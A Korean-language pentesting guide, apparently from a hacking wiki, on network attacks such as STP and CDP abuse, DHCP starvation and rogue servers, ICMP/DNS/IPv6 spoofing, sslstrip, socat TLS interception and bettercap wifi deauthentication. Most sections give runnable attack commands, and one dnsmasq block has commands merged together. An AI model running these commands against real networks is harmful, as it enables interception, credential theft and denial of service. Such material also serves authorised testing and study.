공격자는 스위치의 동작을 모방하여 네트워크의 STP 루트가 되도록 합니다. 그런 다음, 더 많은 데이터가 그를 통과하게 됩니다. 이는 두 개의 다른 스위치에 연결된 경우 흥미로울 수 있습니다.\
이는 BPDUs CONF 패킷을 보내어 **우선 순위** 값이 실제 루트 스위치의 실제 우선 순위보다 작다고 말하는 것으로 수행됩니다.

```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```

**만약 공격자가 2개의 스위치에 연결되어 있다면, 그는 새로운 트리의 루트가 되어 그 사이의 모든 트래픽이 그를 통과하게 됩니다** (MITM 공격이 수행될 것입니다).

```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```

### CDP 공격

CISCO Discovery Protocol (CDP)는 CISCO 장치 간의 통신을 위해 필수적이며, **각각을 식별하고 구성 세부 정보를 공유**할 수 있게 합니다.

#### 수동 데이터 수집 <a href="#id-0e0f" id="id-0e0f"></a>

CDP는 모든 포트를 통해 정보를 브로드캐스트하도록 구성되어 있어 보안 위험을 초래할 수 있습니다. 공격자는 스위치 포트에 연결한 후 **Wireshark**, **tcpdump**, 또는 **Yersinia**와 같은 네트워크 스니퍼를 배치할 수 있습니다. 이 작업은 네트워크 장치에 대한 민감한 데이터를 노출시킬 수 있으며, 해당 장치의 모델 및 Cisco IOS 버전을 포함합니다. 공격자는 식별된 Cisco IOS 버전의 특정 취약점을 대상으로 할 수 있습니다.

#### CDP 테이블 플러딩 유도 <a href="#id-0d6a" id="id-0d6a"></a>

더 공격적인 접근 방식은 스위치의 메모리를 압도하여 서비스 거부 (DoS) 공격을 발동하는 것으로, 합법적인 CISCO 장치인 척합니다. 아래는 테스트를 위해 설계된 네트워크 도구인 Yersinia를 사용하여 이러한 공격을 시작하는 명령 시퀀스입니다:

```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```

이 공격 중에는 스위치의 CPU와 CDP 이웃 테이블이 과도한 리소스 소비로 인해 \*\*"네트워크 마비"\*\*라고 불리는 상황이 발생합니다.

#### CDP 위장 공격

```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```

[**scapy**](https://github.com/secdev/scapy/)을 사용할 수도 있습니다. `scapy/contrib` 패키지와 함께 설치해야 합니다.

### VoIP 공격과 VoIP Hopper 도구

IoT 장치와 점점 통합되는 VoIP 전화기는 특정 전화번호를 통해 문을 열거나 온도 조절 등의 기능을 제공합니다. 그러나 이러한 통합은 보안 위험을 야기할 수 있습니다.

[**voiphopper**](http://voiphopper.sourceforge.net) 도구는 다양한 환경(Cisco, Avaya, Nortel, Alcatel-Lucent)에서 VoIP 전화기를 에뮬레이션하기 위해 설계되었습니다. 이 도구는 CDP, DHCP, LLDP-MED, 802.1Q ARP와 같은 프로토콜을 사용하여 음성 네트워크의 VLAN ID를 탐지합니다.

**VoIP Hopper**는 Cisco Discovery Protocol (CDP)에 대해 세 가지 모드를 제공합니다:

1. **스니핑 모드** (`-c 0`): 네트워크 패킷을 분석하여 VLAN ID를 식별합니다.
2. **스푸핑 모드** (`-c 1`): 실제 VoIP 장치와 유사한 사용자 정의 패킷을 생성합니다.
3. **미리 만들어진 패킷을 사용한 스푸핑 모드** (`-c 2`): 특정 Cisco IP 전화기 모델과 동일한 패킷을 전송합니다.

속도를 위해 선호되는 모드는 세 번째 모드입니다. 다음을 지정해야 합니다:

* 공격자의 네트워크 인터페이스 (`-i` 매개변수).
* 에뮬레이션할 VoIP 장치의 이름 (`-E` 매개변수), Cisco 네이밍 형식을 따라야 합니다 (예: MAC 주소 뒤에 SEP).

기업 환경에서 기존의 VoIP 장치를 모방하기 위해 다음을 수행할 수 있습니다:

* 전화기의 MAC 레이블을 확인합니다.
* 전화기의 디스플레이 설정을 탐색하여 모델 정보를 확인합니다.
* VoIP 장치를 노트북에 연결하고 Wireshark를 사용하여 CDP 요청을 관찰합니다.

세 번째 모드에서 도구를 실행하기 위한 예시 명령은 다음과 같습니다:

```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```

DHCP 공격

#### 열거

DHCP(Dynamic Host Configuration Protocol)는 네트워크에서 IP 주소 및 기타 네트워크 구성 정보를 동적으로 할당하는 프로토콜입니다. DHCP 서버는 클라이언트에게 IP 주소, 서브넷 마스크, 기본 게이트웨이, DNS 서버 등의 정보를 제공합니다.

DHCP 공격은 네트워크에서 DHCP 서버를 대상으로 하는 공격입니다. 이러한 공격은 다양한 목적으로 사용될 수 있습니다. 예를 들어, 공격자는 DHCP 서버를 이용하여 네트워크 트래픽을 가로채거나, 클라이언트의 IP 주소를 변조하여 중간자 공격을 수행할 수 있습니다.

DHCP 공격을 수행하기 전에, 공격자는 대상 네트워크에서 DHCP 서버의 IP 주소를 알아내야 합니다. 이를 위해 다양한 열거 기법을 사용할 수 있습니다. 열거는 네트워크에서 DHCP 서버의 존재 여부를 확인하고, IP 주소를 획득하기 위한 과정입니다.

다음은 DHCP 서버를 열거하기 위해 사용할 수 있는 몇 가지 기법입니다:

* DHCP Discover 패킷 전송: 공격자는 네트워크에서 DHCP Discover 패킷을 전송하여 DHCP 서버의 응답을 확인할 수 있습니다.
* ARP 스캔: 공격자는 ARP 스캔을 통해 네트워크에서 DHCP 서버의 MAC 주소를 확인할 수 있습니다.
* DHCP Starvation 공격: 공격자는 대량의 DHCP 요청을 생성하여 DHCP 서버의 IP 주소를 고갈시키고, 다른 클라이언트가 IP 주소를 할당받지 못하도록 할 수 있습니다.

이러한 열거 기법을 사용하여 DHCP 서버를 찾은 후, 공격자는 다양한 DHCP 공격 기법을 사용하여 공격을 수행할 수 있습니다.

```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```

**DoS**

DHCP 서버에 대해 수행할 수 있는 **두 가지 유형의 DoS**가 있습니다. 첫 번째 유형은 **모든 가능한 IP 주소를 사용하기 위해 충분한 가짜 호스트를 시뮬레이션하는 것**입니다.\
이 공격은 DHCP 서버의 응답을 볼 수 있고 프로토콜을 완료할 수 있는 경우에만 작동합니다 (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). 예를 들어, 이는 **Wifi 네트워크에서는 불가능**합니다.

DHCP DoS를 수행하는 또 다른 방법은 모든 가능한 IP를 소스 코드로 사용하여 **DHCP-RELEASE 패킷을 보내는 것**입니다. 그러면 서버는 모든 사람이 IP를 사용을 마쳤다고 생각할 것입니다.

```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```

더 자동화된 방법은 [DHCPing](https://github.com/kamorin/DHCPig) 도구를 사용하는 것입니다.

언급된 DoS 공격을 사용하여 클라이언트가 환경 내에서 새로운 임대를 얻도록 하고, 합법적인 서버를 고갈시켜 응답하지 않게 할 수 있습니다. 따라서 합법적인 서버가 다시 연결을 시도할 때, **다음 공격에서 언급된 악성 값들을 제공할 수 있습니다**.

#### 악성 값 설정

DHCP 스크립트인 `/usr/share/responder/DHCP.py`를 사용하여 로그 DHCP 서버를 설정할 수 있습니다. 이는 HTTP 트래픽과 자격증명을 캡처하기 위해 트래픽을 악성 서버로 리디렉션하는 것과 같은 네트워크 공격에 유용합니다. 그러나 로그 게이트웨이를 설정하는 것은 실제 게이트웨이의 응답을 놓치기 때문에 효과가 덜합니다. 대신, 악성 DNS 또는 WPAD 서버를 설정하는 것이 더 효과적인 공격을 위해 권장됩니다.

아래는 로그 DHCP 서버를 구성하기 위한 명령 옵션입니다:

* **우리 IP 주소 (게이트웨이 광고)**: `-i 10.0.0.100`을 사용하여 자신의 기계 IP를 게이트웨이로 광고합니다.
* **로컬 DNS 도메인 이름**: 선택적으로 `-d example.org`을 사용하여 로컬 DNS 도메인 이름을 설정할 수 있습니다.
* **원래 라우터/게이트웨이 IP**: 합법적인 라우터 또는 게이트웨이의 IP 주소를 지정하기 위해 `-r 10.0.0.1`을 사용합니다.
* **기본 DNS 서버 IP**: 제어하는 악성 DNS 서버의 IP 주소를 설정하기 위해 `-p 10.0.0.100`을 사용합니다.
* **보조 DNS 서버 IP**: 선택적으로 보조 DNS 서버 IP를 설정하기 위해 `-s 10.0.0.1`을 사용합니다.
* **로컬 네트워크의 넷마스크**: 로컬 네트워크의 넷마스크를 정의하기 위해 `-n 255.255.255.0`을 사용합니다.
* **DHCP 트래픽을 위한 인터페이스**: 특정 네트워크 인터페이스에서 DHCP 트래픽을 수신하기 위해 `-I eth1`을 사용합니다.
* **WPAD 구성 주소**: 웹 트래픽 가로채기를 돕기 위한 WPAD 구성 주소를 설정하기 위해 `-w “http://10.0.0.100/wpad.dat”`을 사용합니다.
* **기본 게이트웨이 IP 스푸핑**: 기본 게이트웨이 IP 주소를 스푸핑하기 위해 `-S`를 포함합니다.
* **모든 DHCP 요청에 응답**: 서버가 모든 DHCP 요청에 응답하도록 하기 위해 `-R`을 포함합니다. 그러나 이는 소음이 발생하고 감지될 수 있으므로 주의해야 합니다.

이러한 옵션을 올바르게 사용하여 로그 DHCP 서버를 설정하여 네트워크 트래픽을 효과적으로 가로챌 수 있습니다.

```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```

### **EAP 공격**

다음은 802.1X 구현에 사용할 수 있는 공격 전술 중 일부입니다:

* EAP를 통한 액티브 브루트 포스 암호 그라인딩
* 잘못된 EAP 콘텐츠로 RADIUS 서버 공격 _\*\*_(exploits)
* EAP 메시지 캡처 및 오프라인 암호 크래킹 (EAP-MD5 및 PEAP)
* TLS 인증서 유효성 검사 우회를 위해 EAP-MD5 인증 강제
* 허브 또는 유사한 것을 사용하여 인증 후 악성 네트워크 트래픽 주입

공격자가 피해자와 인증 서버 사이에 위치한 경우, 그는 인증 프로토콜을 필요한 경우 EAP-MD5로 저하시킬 수 있으며, 인증 시도를 캡처할 수 있습니다. 그런 다음 다음을 사용하여 브루트 포스 공격을 시도할 수 있습니다:

```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```

### FHRP (GLBP & HSRP) 공격 <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol)은 **핫 리듀전트 라우팅 시스템을 생성**하기 위해 설계된 네트워크 프로토콜의 한 종류이다. FHRP를 사용하면 물리적인 라우터를 하나의 논리적인 장치로 결합하여 장애 허용성을 높이고 부하를 분산할 수 있다.

**Cisco Systems 엔지니어들은 GLBP와 HSRP라는 두 가지 FHRP 프로토콜을 개발했다.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

라우팅 정보 프로토콜(RIP)에는 RIP, RIPv2 및 RIPng의 세 가지 버전이 존재한다. RIP와 RIPv2는 UDP를 사용하여 포트 520으로 피어에게 데이터그램을 전송하고, RIPng는 IPv6 멀티캐스트를 통해 UDP 포트 521로 데이터그램을 브로드캐스트한다. RIPv2에서는 MD5 인증을 지원하며, RIPng에는 기본 인증이 포함되어 있지 않고 IPv6 내의 IPsec AH 및 ESP 헤더에 의존한다.

* **RIP 및 RIPv2:** 통신은 UDP 데이터그램을 사용하여 포트 520에서 이루어진다.
* **RIPng:** IPv6 멀티캐스트를 통해 데이터그램을 브로드캐스트하기 위해 UDP 포트 521을 사용한다.

RIPv2는 MD5 인증을 지원하며, RIPng에는 기본 인증이 포함되어 있지 않고 IPv6 내의 IPsec AH 및 ESP 헤더에 의존한다.

### EIGRP 공격

\*\*EIGRP (Enhanced Interior Gateway Routing Protocol)\*\*은 동적 라우팅 프로토콜이다. **거리 벡터 프로토콜**이다. 인증이 없고 패시브 인터페이스의 구성이 없는 경우, **침입자**는 EIGRP 라우팅을 방해하고 **라우팅 테이블 독립성**을 유발할 수 있다. 또한, EIGRP 네트워크(다른 말로 자율 시스템)는 **평면이며 어떠한 존으로도 분할되지 않는다**. **공격자가 경로를 주입**하면 이 경로가 자율 EIGRP 시스템 전체에 **퍼질 가능성**이 높다.

EIGRP 시스템을 공격하기 위해서는 **합법적인 EIGRP 라우터와 이웃 관계를 형성**해야 하며, 이는 기본적인 정찰부터 다양한 주입까지 다양한 가능성을 열어준다.

[**FRRouting**](https://frrouting.org/)을 사용하면 BGP, OSPF, EIGRP, RIP 및 기타 프로토콜을 지원하는 **가상 라우터를 구현**할 수 있다. 공격자의 시스템에 배포하기만 하면 라우팅 도메인에서 합법적인 라우터인 척 할 수 있다.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/)는 EIGRP (Enhanced Interior Gateway Routing Protocol) 브로드캐스트를 가로채는 기능을 제공한다. 패킷 주입도 가능하며, 이를 활용하여 라우팅 구성을 변경할 수 있다.

### OSPF

Open Shortest Path First (OSPF) 프로토콜에서는 **MD5 인증을 통해 라우터 간의 안전한 통신을 보장**하는 것이 일반적이다. 그러나 Loki와 John the Ripper와 같은 도구를 사용하여 이 보안 조치를 침해할 수 있다. 이러한 도구는 MD5 해시를 캡처하고 크래킹하여 인증 키를 노출시킬 수 있다. 이 키를 획득하면 새로운 라우팅 정보를 도입하는 데 사용할 수 있다. 라우트 매개변수를 구성하고 침해된 키를 설정하기 위해 _Injection_ 및 _Connection_ 탭을 사용한다.

* **MD5 해시 캡처 및 크래킹:** Loki와 John the Ripper와 같은 도구를 사용한다.
* **라우트 매개변수 구성:** _Injection_ 탭을 통해 수행한다.
* **침해된 키 설정:** _Connection_ 탭에서 키를 구성한다.

### 기타 일반 도구 및 소스

* [**Above**](https://github.com/c4s73r/Above): 네트워크 트래픽을 스캔하고 취약점을 찾는 도구
* 네트워크 공격에 대한 \*\*추가 정보는 [여기](https://github.com/Sab0tag3d/MITM-cheatsheet)\*\*에서 찾을 수 있다.

## **스푸핑**

공격자는 가짜 DHCP 응답을 보내어 네트워크의 새로운 구성원의 모든 네트워크 매개변수(GW, IP, DNS)를 설정한다.

```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```

### ARP 스푸핑

[이전 섹션](./#arp-spoofing)을 확인하세요.

### ICMPRedirect

ICMP 리디렉션은 ICMP 패킷을 보내는 것으로, 타입 1 코드 5인 ICMP 패킷을 보내어 공격자가 특정 IP에 접근하는 가장 좋은 방법임을 알려줍니다. 그런 다음 피해자가 해당 IP에 연락하려고 할 때, 패킷은 공격자를 통해 전송됩니다.

```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```

### DNS 스푸핑

공격자는 피해자가 요청한 도메인 중 일부 (또는 모두)를 해석합니다.

```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```

**dnsmasq를 사용하여 자체 DNS 구성**

dnsmasq는 작고 가벼운 DNS 서버 및 DHCP 서버로 사용할 수 있는 도구입니다. 이를 사용하여 자체 DNS 서버를 구성할 수 있습니다. 이를 통해 특정 도메인 이름을 특정 IP 주소로 매핑하거나, DNS 캐싱을 통해 네트워크 성능을 향상시킬 수 있습니다.

다음은 dnsmasq를 사용하여 자체 DNS 서버를 구성하는 방법입니다.

1. dnsmasq 패키지를 설치합니다.
   * Debian/Ubuntu: `sudo apt-get install dnsmasq`
   * CentOS/RHEL: `sudo yum install dnsmasq`
2. `/etc/dnsmasq.conf` 파일을 엽니다.
3. 필요한 경우, `listen-address` 옵션을 사용하여 DNS 서버가 수신 대기할 IP 주소를 지정합니다. 기본적으로 모든 인터페이스에서 수신 대기합니다.
4. 필요한 경우, `server` 옵션을 사용하여 외부 DNS 서버를 지정합니다. 이를 통해 외부 DNS 서버로의 요청을 전달할 수 있습니다.
5. 필요한 경우, `address` 옵션을 사용하여 특정 도메인 이름을 특정 IP 주소로 매핑합니다. 이를 통해 로컬에서 특정 도메인 이름을 사용할 수 있습니다.
6. 필요한 경우, `cache-size` 옵션을 사용하여 DNS 캐시의 크기를 지정합니다. 이를 통해 DNS 쿼리의 응답 시간을 단축시킬 수 있습니다.
7. `dnsmasq` 서비스를 시작합니다.
   * Debian/Ubuntu: `sudo systemctl start dnsmasq`
   * CentOS/RHEL: `sudo service dnsmasq start`

이제 dnsmasq를 사용하여 자체 DNS 서버를 구성했습니다. 이를 통해 DNS 관련 작업을 보다 효율적으로 수행할 수 있습니다.

```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```

### 로컬 게이트웨이

시스템과 네트워크로의 여러 경로가 종종 존재합니다. 로컬 네트워크 내에서 MAC 주소 목록을 작성한 후, \_gateway-finder.py\_를 사용하여 IPv4 포워딩을 지원하는 호스트를 식별하세요.

```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```

### [LLMNR, NBT-NS, 및 mDNS 스푸핑](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoft 시스템은 DNS 조회가 실패할 경우 로컬 호스트 해결을 위해 **링크 로컬 멀티캐스트 이름 해결 (LLMNR)** 및 \*\*NetBIOS 이름 서비스 (NBT-NS)\*\*를 사용합니다. 마찬가지로 **Apple Bonjour** 및 **Linux zero-configuration** 구현은 네트워크 내의 시스템을 발견하기 위해 \*\*멀티캐스트 DNS (mDNS)\*\*를 사용합니다. 이러한 프로토콜은 인증되지 않은 특성과 UDP를 통한 메시지 브로드캐스팅으로 인해, 악의적인 서비스로 사용자를 리디렉션하는 공격자에 의해 악용될 수 있습니다.

Responder를 사용하여 호스트가 검색하는 서비스를 가장할 수 있습니다.\
[Responder를 사용하여 서비스를 가장하는 방법에 대한 자세한 정보는 여기에서 확인하세요](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [WPAD 스푸핑](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

브라우저는 일반적으로 **웹 프록시 자동 구성 (WPAD) 프로토콜을 사용하여 프록시 설정을 자동으로 얻습니다**. 이는 "http://wpad.example.org/wpad.dat"와 같은 URL을 통해 구성 세부 정보를 서버에서 가져오는 것을 포함합니다. 클라이언트에 의한 이 서버의 발견은 다음과 같은 메커니즘을 통해 이루어질 수 있습니다:

* **DHCP**를 통해, 특별한 코드 252 항목을 사용하여 발견이 용이하게 됩니다.
* **DNS**를 통해, 로컬 도메인 내에서 \_wpad\_로 레이블이 지정된 호스트 이름을 검색하는 것을 의미합니다.
* **Microsoft LLMNR 및 NBT-NS**를 통해, DNS 조회가 성공하지 않은 경우에 대비한 대체 메커니즘으로 사용됩니다.

Responder 도구는 악의적인 **WPAD 서버**로서 이 프로토콜을 이용합니다. DHCP, DNS, LLMNR 및 NBT-NS를 사용하여 클라이언트가 이 서버에 연결되도록 속이는 것입니다. Responder를 사용하여 서비스를 가장하는 방법에 대해 자세히 알아보려면 [여기를 확인하세요](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [SSDP 및 UPnP 장치 스푸핑](spoofing-ssdp-and-upnp-devices.md)

네트워크에서 다양한 서비스를 제공하여 사용자를 속이고 일부 평문 자격 증명을 입력하도록 유도할 수 있습니다. **이 공격에 대한 자세한 정보는** [**SSDP 및 UPnP 장치 스푸핑**](spoofing-ssdp-and-upnp-devices.md)**에서 확인하세요**.

### IPv6 이웃 스푸핑

이 공격은 ARP 스푸핑과 매우 유사하지만 IPv6 환경에서 발생합니다. 피해자가 공격자의 MAC 주소를 가진 GW의 IPv6를 가지고 있다고 생각하게 할 수 있습니다.

```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```

### IPv6 라우터 광고 스푸핑/플러딩

일부 운영체제는 기본적으로 네트워크에서 전송된 RA 패킷에서 게이트웨이를 구성합니다. 공격자를 IPv6 라우터로 선언하기 위해 다음을 사용할 수 있습니다:

```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```

### IPv6 DHCP 스푸핑

기본적으로 일부 운영체제는 네트워크에서 DHCPv6 패킷을 읽어 DNS를 구성하려고 시도합니다. 그런 다음, 공격자는 자신을 DNS로 구성하기 위해 DHCPv6 패킷을 보낼 수 있습니다. DHCP는 또한 피해자에게 IPv6를 제공합니다.

```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```

### HTTP (가짜 페이지 및 JS 코드 삽입)

## 인터넷 공격

### sslStrip

이 공격은 **사용자**가 **HTTP** 페이지에 접근하려고 할 때, 해당 페이지가 **HTTPS** 버전으로 **리디렉션**되는 경우에 수행됩니다. **sslStrip**은 **클라이언트와 HTTP 연결** 및 **서버와 HTTPS 연결**을 유지하여 연결을 **평문으로 스니핑**할 수 있습니다.

```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```

더 많은 정보는 [여기](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)에서 확인할 수 있습니다.

### HSTS 우회를 위한 sslStrip+ 및 dns2proxy

**sslStrip+와 dns2proxy**는 **sslStrip**과의 **차이점**은 예를 들어 \_**www.facebook.com**\_을 \_**wwww.facebook.com**\_으로 **리다이렉트**하고 이 도메인의 **주소를 공격자 IP로 설정**한다는 것입니다. 이렇게 하면 **클라이언트**는 _**wwww.facebook.com**_ (공격자)에 **연결**하지만 \*\*sslstrip+\*\*는 **실제 연결**을 통해 **www.facebook.com**과의 https 연결을 유지합니다.

이 기술의 **목표**는 \_**wwww**.facebook.com\_이 브라우저의 **캐시에 저장되지 않으므로** HSTS를 **회피**하는 것입니다. 따라서 브라우저는 **facebook 인증을 HTTP로 수행하도록 속일 수 있습니다**.\
이 공격을 수행하려면 피해자가 처음에 [http://www.faceook.com](http://www.faceook.com)에 액세스하려고 시도해야 합니다. 이는 http 페이지 내의 링크를 수정하여 수행할 수 있습니다.

더 많은 정보는 [여기](https://www.bettercap.org/legacy/#hsts-bypass), [여기](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) 및 [여기](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)에서 확인할 수 있습니다.

**sslStrip 또는 sslStrip+는 더 이상 작동하지 않습니다. 이는 브라우저에 미리 저장된 HSTS 규칙이 있기 때문입니다. 따라서 사용자가 "중요한" 도메인에 처음 액세스하는 경우에도 HTTPS를 통해 액세스합니다. 또한, 미리 저장된 규칙과 생성된 다른 규칙은** [**`includeSubdomains`**](https://hstspreload.appspot.com) **플래그를 사용할 수 있으므로 앞에서 언급한 \_**wwww.facebook.com**\_ 예제는** _**facebook.com**_ **이 `includeSubdomains`를 사용하여 HSTS를 사용하므로 더 이상 작동하지 않습니다.**

TODO: easy-creds, evilgrade, metasploit, factory

## 포트에서 TCP 수신 대기

```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```

## 포트에서 TCP + SSL 수신 대기

#### 키 및 자체 서명된 인증서 생성

```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```

#### 인증서를 사용하여 도청하기

To perform a man-in-the-middle attack and listen to network traffic using a certificate, follow these steps:

1. Generate a self-signed certificate or obtain a valid certificate.
2. Set up a proxy server to intercept the traffic.
3. Install the certificate on the proxy server.
4. Configure the client devices to trust the certificate.
5. Redirect the traffic to the proxy server.
6. Decrypt and analyze the intercepted traffic.

By using a certificate, you can decrypt encrypted traffic and gain access to sensitive information such as usernames, passwords, and other confidential data. However, it is important to note that this technique may be illegal and unethical if used without proper authorization. Always ensure you have the necessary permissions and legal rights before attempting any hacking activities.

```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```

#### 인증서를 사용하여 듣고 호스트로 리디렉션하기

To listen to network traffic, you can use a certificate to decrypt the encrypted communication. This allows you to intercept and analyze the data being transmitted between hosts. By redirecting the traffic to your own machine, you can gain visibility into the communication and potentially exploit vulnerabilities.

Here is a step-by-step guide on how to listen using a certificate and redirect the traffic to the hosts:

1. Generate a certificate: Start by generating a certificate that will be used to decrypt the traffic. You can use tools like OpenSSL to create a self-signed certificate.
2. Install the certificate: Once the certificate is generated, you need to install it on the machine where you will be intercepting the traffic. This can be done by importing the certificate into the trusted root certificate store.
3. Configure the interception: Set up a proxy server or a Man-in-the-Middle (MitM) attack to intercept the traffic. This can be done using tools like Burp Suite or mitmproxy.
4. Redirect the traffic: Configure the proxy server or MitM attack to redirect the intercepted traffic to the desired hosts. This can be done by modifying the network settings or using specific tools provided by the interception tool.
5. Analyze the traffic: Once the traffic is redirected, you can analyze it using various tools and techniques. This includes inspecting the HTTP requests and responses, analyzing the SSL/TLS handshake, and identifying potential vulnerabilities.

By listening using a certificate and redirecting the traffic to the hosts, you can gain valuable insights into the communication and identify potential security weaknesses. However, it is important to note that intercepting network traffic without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal rights before performing any interception activities.

```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```

클라이언트가 CA가 유효한지 확인하는 경우, **CA에 의해 서명된 다른 호스트 이름의 인증서를 제공**할 수도 있습니다.\
또 다른 흥미로운 테스트는 요청된 호스트 이름의 **자체 서명된 인증서를 제공**하는 것입니다.

다른 테스트할 사항으로는 유효한 CA가 아닌 유효한 인증서로 인증서를 서명하려고 시도하는 것이 있습니다. 또는 유효한 공개 키를 사용하여 실제 개인 키로 아무것도 해독할 필요가 없는 디피 헬만과 같은 알고리즘을 강제로 사용하고 클라이언트가 실제 개인 키의 프로브(해시와 같은 것)를 요청할 때 가짜 프로브를 보내고 클라이언트가 이를 확인하지 않도록 기대하는 것입니다.

## Bettercap

```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```

### Active Discovery Notes

디바이스로 UDP 패킷을 보낼 때, 요청한 포트를 가지고 있지 않은 경우 ICMP (Port Unreachable)가 전송됩니다.

### **ARP 탐색**

ARP 패킷은 네트워크 내에서 사용되는 IP를 발견하는 데 사용됩니다. PC는 각 가능한 IP 주소에 대한 요청을 보내고 사용 중인 IP만 응답합니다.

### **mDNS (멀티캐스트 DNS)**

Bettercap은 **\_services\_.dns-sd.\_udp.local**을 요청하는 MDNS 요청을 보냅니다 (X ms마다). 이 패킷을 본 기기는 일반적으로 이 요청에 응답합니다. 그런 다음 "services"에 응답하는 기기만 찾습니다.

**도구**

